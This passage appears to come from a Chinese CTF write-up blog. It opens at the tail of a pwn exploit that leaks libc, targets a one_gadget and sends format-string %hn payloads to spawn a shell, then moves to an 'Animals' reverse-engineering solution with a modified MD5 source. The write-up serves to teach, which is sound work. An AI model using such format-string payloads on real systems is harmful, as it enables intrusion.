class="hljs-number">0x13c6</span><br><span class="hljs-built_in">logs</span>(elf.address)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">243</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">logs</span>(libc.address)<br><br>one = libc.address + <span class="hljs-number">0xe3b01</span><br><br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>$hhnAAAAAAA<span class="hljs-number">&#x27;</span> + <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br>ret_addr += <span class="hljs-number">16</span><br>one1 = one &amp; <span class="hljs-number">0xffff</span><br>one2 = (one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-meta">#dbg()</span><br>payload = b<span class="hljs-number">&#x27;</span>EXIT\r%<span class="hljs-string">&#x27; + str(one1-5).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need a str: &quot;</span>,payload)<br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-string">&#x27; + str(one2).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr + <span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br><span class="hljs-built_in">shell</span>()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Animals"><a href="#Animals" class="headerlink" title="Animals"></a>Animals</h3><p>程序加了很多花指令，使用idapython进行去花。<br>修复完成后所有程序爆红，在这里更改成全部都是主函数范围内，并记录结束地址：<code>406DA8</code><br>发现MD5函数，跟进去发现这里MD5的码表被转换了，1和2交换，3和4交换，所以，改写md5.c文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;md5.h&quot;</span></span><br> <br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PADDING[]=&#123;<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br>                         <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Init</span><span class="hljs-params">(MD5_CTX *context)</span></span><br><span class="hljs-function"></span>&#123;<br>     context-&gt;count[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0xEFCDAB89</span>;<br>     context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0x67452301</span>;<br>     context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10325476</span>;<br>     context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x98BADCFE</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Update</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inputlen)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,index = <span class="hljs-number">0</span>,partlen = <span class="hljs-number">0</span>;<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    partlen = <span class="hljs-number">64</span> - index;<br>    context-&gt;count[<span class="hljs-number">0</span>] += inputlen &lt;&lt; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span>(context-&gt;count[<span class="hljs-number">0</span>] &lt; (inputlen &lt;&lt; <span class="hljs-number">3</span>))<br>       context-&gt;count[<span class="hljs-number">1</span>]++;<br>    context-&gt;count[<span class="hljs-number">1</span>] += inputlen &gt;&gt; <span class="hljs-number">29</span>;<br>    <br>    <span class="hljs-keyword">if</span>(inputlen &gt;= partlen)<br>    &#123;<br>       <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],input,partlen);<br>       <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,context-&gt;buffer);<br>       <span class="hljs-keyword">for</span>(i = partlen;i+<span class="hljs-number">64</span> &lt;= inputlen;i+=<span class="hljs-number">64</span>)<br>           <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,&amp;input[i]);<br>       index = <span class="hljs-number">0</span>;        <br>    &#125;  <br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        i = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],&amp;input[i],inputlen-i);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Final</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> digest[<span class="hljs-number">16</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>,padlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> bits[<span class="hljs-number">8</span>];<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    padlen = (index &lt; <span class="hljs-number">56</span>)?(<span class="hljs-number">56</span>-index):(<span class="hljs-number">120</span>-index);<br>    <span class="hljs-built_in">MD5Encode</span>(bits,context-&gt;count,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Update</span>(context,PADDING,padlen);<br>    <span class="hljs-built_in">MD5Update</span>(context,bits,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Encode</span>(digest,context-&gt;state,<span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Encode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(j &lt; len)<br>    &#123;<br>         output[j] = input[i] &amp; <span class="hljs-number">0xFF</span>;  <br>         output[j+<span class="hljs-number">1</span>] = (input[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">2</span>] = (input[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">3</span>] = (input[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         i++;<br>         j+=<span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">while</span>(j &lt; len)<br>     &#123;<br>           output[i] = (input[j]) |<br>                       (input[j+<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) |<br>                       (input[j+<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">16</span>) |<br>                       (input[j+<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">24</span>);<br>           i++;<br>           j+=<span class="hljs-number">4</span>; <br>     &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Transform</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>],<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> block[<span class="hljs-number">64</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a = state[<span class="hljs-number">0</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> b = state[<span class="hljs-number">1</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> c = state[<span class="hljs-number">2</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> d = state[<span class="hljs-number">3</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x[<span class="hljs-number">64</span>];<br>     <span class="hljs-built_in">MD5Decode</span>(x,block,<span class="hljs-number">64</span>);<br>     <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xd76aa478</span>); <span class="hljs-comment">/* 1 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">1</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xe8c7b756</span>); <span class="hljs-comment">/* 2 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0x242070db</span>); <span class="hljs-comment">/* 3 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">3</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xc1bdceee</span>); <span class="hljs-comment">/* 4 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xf57c0faf</span>); <span class="hljs-comment">/* 5 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">5</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x4787c62a</span>); <span class="hljs-comment">/* 6 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa8304613</span>); <span class="hljs-comment">/* 7 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">7</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xfd469501</span>); <span class="hljs-comment">/* 8 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x698098d8</span>); <span class="hljs-comment">/* 9 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">9</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x8b44f7af</span>); <span class="hljs-comment">/* 10 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xffff5bb1</span>); <span class="hljs-comment">/* 11 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">11</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x895cd7be</span>); <span class="hljs-comment">/* 12 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x6b901122</span>); <span class="hljs-comment">/* 13 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[<span class="hljs-number">13</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xfd987193</span>); <span class="hljs-comment">/* 14 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa679438e</span>); <span class="hljs-comment">/* 15 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">15</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x49b40821</span>); <span class="hljs-comment">/* 16 */</span><br> <br> <span class="hljs-comment">/* Round 2 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xf61e2562</span>); <span class="hljs-comment">/* 17 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">6</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc040b340</span>); <span class="hljs-comment">/* 18 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x265e5a51</span>); <span class="hljs-comment">/* 19 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">0</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe9b6c7aa</span>); <span class="hljs-comment">/* 20 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xd62f105d</span>); <span class="hljs-comment">/* 21 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">10</span>], <span class="hljs-number">9</span>,  <span class="hljs-number">0x2441453</span>); <span class="hljs-comment">/* 22 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xd8a1e681</span>); <span class="hljs-comment">/* 23 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">4</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe7d3fbc8</span>); <span class="hljs-comment">/* 24 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0x21e1cde6</span>); <span class="hljs-comment">/* 25 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">14</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc33707d6</span>); <span class="hljs-comment">/* 26 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xf4d50d87</span>); <span class="hljs-comment">/* 27 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">8</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x455a14ed</span>); <span class="hljs-comment">/* 28 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xa9e3e905</span>); <span class="hljs-comment">/* 29 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">2</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xfcefa3f8</span>); <span class="hljs-comment">/* 30 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x676f02d9</span>); <span class="hljs-comment">/* 31 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[<span class="hljs-number">12</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x8d2a4c8a</span>); <span class="hljs-comment">/* 32 */</span><br> <br> <span class="hljs-comment">/* Round 3 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xfffa3942</span>); <span class="hljs-comment">/* 33 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">8</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x8771f681</span>); <span class="hljs-comment">/* 34 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x6d9d6122</span>); <span class="hljs-comment">/* 35 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">14</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xfde5380c</span>); <span class="hljs-comment">/* 36 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xa4beea44</span>); <span class="hljs-comment">/* 37 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">4</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x4bdecfa9</span>); <span class="hljs-comment">/* 38 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xf6bb4b60</span>); <span class="hljs-comment">/* 39 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">10</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xbebfbc70</span>); <span class="hljs-comment">/* 40 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0x289b7ec6</span>); <span class="hljs-comment">/* 41 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">0</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xeaa127fa</span>); <span class="hljs-comment">/* 42 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xd4ef3085</span>); <span class="hljs-comment">/* 43 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">6</span>], <span class="hljs-number">23</span>,  <span class="hljs-number">0x4881d05</span>); <span class="hljs-comment">/* 44 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xd9d4d039</span>); <span class="hljs-comment">/* 45 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[<span class="hljs-number">12</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xe6db99e5</span>); <span class="hljs-comment">/* 46 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x1fa27cf8</span>); <span class="hljs-comment">/* 47 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">2</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xc4ac5665</span>); <span class="hljs-comment">/* 48 */</span><br> <br> <span class="hljs-comment">/* Round 4 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf4292244</span>); <span class="hljs-comment">/* 49 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">7</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x432aff97</span>); <span class="hljs-comment">/* 50 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xab9423a7</span>); <span class="hljs-comment">/* 51 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">5</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xfc93a039</span>); <span class="hljs-comment">/* 52 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x655b59c3</span>); <span class="hljs-comment">/* 53 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">3</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x8f0ccc92</span>); <span class="hljs-comment">/* 54 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xffeff47d</span>); <span class="hljs-comment">/* 55 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">1</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x85845dd1</span>); <span class="hljs-comment">/* 56 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x6fa87e4f</span>); <span class="hljs-comment">/* 57 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">15</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xfe2ce6e0</span>); <span class="hljs-comment">/* 58 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xa3014314</span>); <span class="hljs-comment">/* 59 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[<span class="hljs-number">13</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x4e0811a1</span>); <span class="hljs-comment">/* 60 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf7537e82</span>); <span class="hljs-comment">/* 61 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">11</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xbd3af235</span>); <span class="hljs-comment">/* 62 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0x2ad7d2bb</span>); <span class="hljs-comment">/* 63 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">9</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xeb86d391</span>); <span class="hljs-comment">/* 64 */</span><br>     state[<span class="hljs-number">0</span>] += a;<br>     state[<span class="hljs-number">1</span>] += b;<br>     state[<span class="hljs-number">2</span>] += c;<br>     state[<span class="hljs-number">3</span>] += d;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里对加密结果进行了处理，调试发现他加密的结果就是我们选择的动物的全称，比如说我们选择1则加密dog。所以程序逻辑就是用动物名字加密，然后变异的md5加密后和密文比较，如果比较成功就是对的动物名字，用这个名字的序号再加密md5，最后写exp爆破。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 